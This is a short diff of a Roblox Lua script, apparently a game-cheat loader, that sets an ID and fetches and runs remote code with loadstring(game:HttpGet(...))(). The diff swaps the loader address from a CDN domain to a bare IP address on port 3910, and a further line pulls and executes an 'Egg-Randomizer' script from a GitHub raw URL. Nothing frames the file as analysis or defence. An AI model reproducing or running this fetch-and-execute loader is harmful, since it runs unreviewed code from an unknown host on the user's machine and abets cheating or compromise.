@@ -1,3 +1,3 @@
 ID="5f33b6b2-d31f-4334-95e5-106b75db301b";
-loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
+loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Crimson-Lag/xx/refs/heads/main/Egg-Randomizer"))()
